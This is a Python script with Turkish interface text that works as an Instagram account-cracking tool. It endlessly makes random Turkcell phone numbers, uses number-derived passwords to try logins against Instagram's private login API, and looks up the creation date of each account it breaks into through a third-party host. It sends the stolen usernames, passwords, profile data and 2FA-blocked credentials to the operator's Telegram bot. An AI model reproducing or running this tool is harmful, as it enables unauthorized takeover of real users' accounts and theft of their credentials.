from typing import Mapping


try:
    import random,requests,os,uuid,time,secrets
    from uuid import uuid4
except ModuleNotFoundError:
    os.system('pip install time')
    os.system('pip install uuid')
    os.system('pip install random')
    os.system('pip install requests')

BRed="\033[1;31m" # Red
BGreen="\033[1;32m" # Green
BYellow="\033[1;33m" # Yellow
BBlue="\033[1;34m" # Blue
BPurple="\033[1;35m" # Purple
BCyan="\033[1;36m" # Cyan
BWhite="\033[1;37m" # White
lo = '—'

print(BCyan+"""
MMMMMMMM               MMMMMMMMBBBBBBBBBBBBBBBBB   XXXXXXX       XXXXXXX
M:::::::M             M:::::::MB::::::::::::::::B  X:::::X       X:::::X
M::::::::M           M::::::::MB::::::BBBBBB:::::B X:::::X       X:::::X
M:::::::::M         M:::::::::MBB:::::B     B:::::BX::::::X     X::::::X
M::::::::::M       M::::::::::M  B::::B     B:::::BXXX:::::X   X:::::XXX
M:::::::::::M     M:::::::::::M  B::::B     B:::::B   X:::::X X:::::X
M:::::::M::::M   M::::M:::::::M  B::::BBBBBB:::::B     X:::::X:::::X
M::::::M M::::M M::::M M::::::M  B:::::::::::::BB       X:::::::::X
M::::::M  M::::M::::M  M::::::M  B::::BBBBBB:::::B      X:::::::::X
M::::::M   M:::::::M   M::::::M  B::::B     B:::::B    X:::::X:::::X
M::::::M    M:::::M    M::::::M  B::::B     B:::::B   X:::::X X:::::X
M::::::M     MMMMM     M::::::M  B::::B     B:::::BXXX:::::X   X:::::XXX
M::::::M               M::::::MBB:::::BBBBBB::::::BX::::::X     X::::::X
M::::::M               M::::::MB:::::::::::::::::B X:::::X       X:::::X
M::::::M               M::::::MB::::::::::::::::B  X:::::X       X:::::X
MMMMMMMM               MMMMMMMMBBBBBBBBBBBBBBBBB   XXXXXXX       XXXXXXX 
""")

print(' ')
print(BCyan+lo*88)
print(' ')                               
myadmin = input("   "+BGreen+"- MBX-İD GİRİN:  ")
tele = input("  "+BPurple+"-  MBX-TOKEN GİRİN:  ")
os.system(' ')
print("""
   """+BRed+"""        
"""+BGreen+"""          
"""+BYellow+""" Doğru hesap çıkınca mesaj gelecektir """)
print('')
print(BGreen+lo*88)
print(' ')
def info(user2,pasw):
    global tele,myadmin,mess
    cookie = secrets.token_hex(8)*2
    headr = {
        'HOST': "www.instagram.com",
        'KeepAlive' : 'True',
        'user-agent' :'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36',
        'Cookie': 'cookie',
        'Accept' : "*/*",
        'ContentType' : "application/x-www-form-urlencoded",
        "X-Requested-With" : "XMLHttpRequest",
        "X-IG-App-ID": "936619743392459",
        "X-Instagram-AJAX" : "missing",
        "X-CSRFToken" : "missing",
        "Accept-Language" : "en-US,en;q=0.9"}
    url2 = f'https://www.instagram.com/{user2}/?__a=1'
    ree = requests.get(url2,headers=headr).json()
    name = str(ree['graphql']['user']['full_name'])
    id = str(ree['graphql']['user']['id'])
    followes = str(ree['graphql']['user']['edge_followed_by']['count'])
    following = str(ree['graphql']['user']['edge_follow']['count'])
    isp = str(ree['graphql']['user']['is_private'])
    ids = str(ree['graphql']['user']['id'])
    bio = str(ree['graphql']['user']['biography'])
    re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")   
    ree = re.json()
    datee = ree['data']
    ms = f"""
    MBX H.o knk
  
• ──────────── •
⌯ isim : {user2}
⌯ Kulanıcı : {name}
⌯ Sifre : {pasw} 
⌯ Takipçi : {followes}
⌯  Takip edilen : {following}
⌯ Bio : {bio}
⌯ Tarih : {datee}

• ──────────── •
» @mertcuan """
    requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text={ms}""")    
    print(BGreen+ms)

while True:
    turkcell = ["535"]
    chars = '0987654321'
    u = '90'
    u1 = str("". join(random.choice(chars)for i in range(7)))
    u2 = str("". join(random.choice(turkcell)for i in range(1)))
    user = '+90'+u2+u1
    pasw = '0'+u2+u1
    
    url = 'https://i.instagram.com/api/v1/accounts/login/'          
    headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*', 
         'Cookie':'missing', 
         'Accept-Encoding':'gzip', 
         'Accept-Language':'fr-FR, en-US', 
         'X-IG-Capabilities':'AQ==', 
         'X-IG-Connection-Type':'MOBILE(HSPA+)', 
         'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
         'Host':'i.instagram.com'}
    uid = str(uuid4())
    data = {
    	'uuid':uid,'password':pasw, 
         'username':user, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
    req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
    if 'logged_in_user' in req_login.text:
        user2 = req_login.json()['logged_in_user']['username']
        info(user2,pasw)
    elif '"message":"challenge_required","challenge"' in req_login.text:
        print("  "+BYellow+f"  ⌯ 2fa ) --> "+BWhite+" :"+BYellow+f" {user}:{pasw} ")
        requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text=
  2fa dostum
    • ──────────── •
    ⌯ User : {user} 
    ⌯ Pasw : {pasw} 
    • ──────────── •
    ⌯ @mertcuan """)
    else:
        print("  "+BCyan+f"  ⌯ Yanlış knk --> "+BWhite+" :"+BGreen+f" {user}:{pasw} ")
  
